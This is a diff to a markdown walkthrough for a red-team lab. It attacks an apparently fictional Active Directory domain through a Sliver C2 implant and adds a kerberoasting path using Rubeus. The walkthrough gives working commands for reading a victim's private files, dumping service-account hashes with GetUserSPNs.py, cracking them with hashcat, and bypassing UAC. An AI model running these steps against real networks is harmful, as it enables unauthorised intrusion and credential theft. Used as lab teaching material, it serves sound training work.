@@ -17,9 +17,9 @@
     - [Execute the stager from the client](#execute-the-stager-from-the-client)
   - [Command and Control and Pivoting](#command-and-control-and-pivoting)
     - [Situational Awareness : Learning about the compromised environment.](#situational-awareness--learning-about-the-compromised-environment)
+    - [Learning about Garfields not-so-private-anymore files.](#learning-about-garfields-not-so-private-anymore-files)
     - [Getting Garfield AD Credentials](#getting-garfield-ad-credentials)
     - [Escalating our Privileges on the compromised client (Bypassing Windows UAC)](#escalating-our-privileges-on-the-compromised-client-bypassing-windows-uac)
-    - [Learning about Garfields not-so-private-anymore files.](#learning-about-garfields-not-so-private-anymore-files)
     - [Pivoting to to other sytems](#pivoting-to-to-other-sytems)
   - [Attacking the Active Directory Infrastructure](#attacking-the-active-directory-infrastructure)
     - [Recon of AD with Bloodhound](#recon-of-ad-with-bloodhound)
@@ -200,7 +200,7 @@ Malware typically try to use living-of-the-land techniques, using legitimate and
 A favourite method of intruders is to use stagers. This means that initial file that is executed on the target machine is a very small file  and lightweight (and therefore difficult to catch). This "stager" then opens up https:// connection to a site on the web where it retrieves the real malware which is executed in memory without touching the disk.
 
 ![Stagers](assets/stagers.png)
-**Stagers**
+**Attacker often use Stagers**
 
 
 ### Waiting for the C2 connection
@@ -255,6 +255,9 @@ Your session should have the name JOYOUS_MORTGAGE, so the command would be
 ```
 sessions -i JOYOUS_MORTGAGE
 ```
+
+Note: You may have several sessions to the same implant. To differentiate between them you have to use the session number, you can use tab completion e.g. sessions -i 7f<tab> if the session starts with 7f.
+
 We now interact with the session, so we can type
 ```
 info
@@ -303,6 +306,39 @@ execute -o nltest /dclist:
 
 We can see that the machine has joined the Active Directory domain via its domain controller dc01.crueltesting.com. Good to know?
 
+### Learning about Garfields not-so-private-anymore files.
+
+The intruder would typically use scripts to find files or emails with keywords.
+
+Here we will just access them directly via standard commands, change into garfield's TODOs directory that contains messages from his manager.
+```
+cd C:/Users/garfield/Documents/TODOs
+```
+and then check what files there are
+```
+ls
+```
+![Todos](assets/TODOs.png)
+
+Now we can read the messages to Garfield from his manager.
+
+Type the following commands in your sliver session (the command cat shows the content of a file, showing feline domination)
+
+```
+cat resetpasswords.txt
+```
+
+```
+cat mice-management-access.txt
+```
+```
+cat tomcat-patch.txt
+```
+![Garfield Work Ahead](assets/garfield-3-TODOS.png)
+
+We learn that the he is supposed to reset a service account weekly, we learn about a fileshare with some interesting content (that garfield cannot access yet, because he is not a domain admin) and we learn about a system "tomcat" that needs patching.
+
+
 ### Getting Garfield AD Credentials
 
 As a first foothold we **may need** some credentials in the Active Directory domain crueltesting.com. There are several methods the attacker could use to get credentials from a domain user.
@@ -331,7 +367,7 @@ Joy! We now hopefully Garfield's domain password.
 
 ### Escalating our Privileges on the compromised client (Bypassing Windows UAC)
 
-As noted above, our privileges are limited (our implant is running with integrity level medium, we want it to be **high**!!!. This is all because of windows UAC.
+As noted above, our privileges are limited - our implant is running with integrity level medium, we want it to be **high**!!!. This is all because of windows UAC.
 
 So we are now going to upload a file to Garfield's Desktop to help us bypass the UAC.
 This file is a PowerShell Script and the technique is described in the appendix.
@@ -379,41 +415,6 @@ This will create another session!
 We will now have 3 sessions as seen by the picture. The initial session with Garfield, another session with Garfield running with **high** integrety which we used to create our 3rd session, running with **system** priority. Since this session runs as a scheduled task, it is also persistent after reboots of the windows machine.
 
 Interact with the session with system privileges (use sessions -i <session number>) and check your privileges.
-
-
-
-### Learning about Garfields not-so-private-anymore files.
-
-The intruder would typically use scripts to find files or emails with keywords.
-
-Here we will just access them directly via standard commands, change into garfield's TODOs directory that contains messages from his manager.
-```
-cd C:/Users/garfield/Documents/TODOs
-```
-and then check what files there are
-```
-ls
-```
-![Todos](assets/TODOs.png)
-
-Now we can read the messages to Garfield from his manager.
-
-Type the following commands in your sliver session (the command cat shows the content of a file, showing feline domination)
-
-```
-cat resetpasswords.txt
-```
-
-```
-cat mice-management-access.txt
-```
-```
-cat tomcat-patch.txt
-```
-![Garfield Work Ahead](assets/garfield-3-TODOS.png)
-
-We learn that the he is supposed to reset a service account weekly, we learn about a fileshare with some interesting content (that garfield cannot access yet, because he is not a domain admin) and we learn about a system "tomcat" that needs patching.
-
 
 
 ### Pivoting to to other sytems
@@ -537,6 +538,7 @@ From bloodhound we learned that there is a service account svc_sql that is a mem
 
 We cannow fetch the hashes of the svc_sql account and try to crack them offline. We can do that from garfields (or any domain users's) account since all authenticated domain users can download the TGS (see Kerberos brief info).
 
+
 From a command shell type
 ```
 proxychains GetUserSPNs.py crueltesting.com/garfield:'catsRCute2026!' -dc-ip 10.0.2.10 -no-rc4 -request -outputfile hashes.kerberoast
@@ -545,7 +547,33 @@ proxychains GetUserSPNs.py crueltesting.com/garfield:'catsRCute2026!' -dc-ip 10.
 
 This should create a file hashes.kerberoast containing the hashes of the service svc-sql password.
 
-We can then try to "crack the hash" with hashcat.
+But what if we did not know the password of Garfield, maybe because he impolitely refused to give it to us when we asked him via phishing or prompting?
+
+Do not worry, since we have already escalated our privileges to SYSTEM, we can use the machine identity to ask for the hashes of the kerberoastable accounts.
+
+In the sliver console with the privileged session, we will install a "helper" rubeus into our Sliver Armory (collection of weapons). Rubeus is a collection of tools to be used in Active Directory attacks.
+
+```
+armory install rubeus
+```
+![Rubeus Install](assets/rubeus-install.png)
+
+Now we can get the hash of the privileged service account without knowing Garfield's password!
+
+In the sliver console, paste
+
+```
+rubeus -t 120 kerberoast
+```
+
+![Kerberoasting with Rubeus from a privileged account](assets/rubeus-kerberoasting.png)
+**Kerberoasting with Rubeus
+
+Note that we have now shown two different paths to acquire the hash of the privileged service account.
+- If we have the username/password of any domain user (privileged or not)
+- If we do not have any username/password but have escalated our privileges on the target machine
+
+Since we have the hash, we will now try to "crack the hash" to recover the clear text password. Somewhat ironically we will use a tool named "hashcat".
 
 Note: Real life cracking of passwords is performed on powerful machines with GPUs, allowing for bruteforcing millions tries per second. In this lab environment with limited hardware we use a wordlist instead.
 
@@ -558,6 +586,7 @@ hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt -D 1
 ![Hashcat output](/assets/hashcat.png)
 
 After some 30 seconds the password should be revealed. We have now cracked the password of svc_sql that is a domain admin!
+
 
 ### Golden Tickets
 
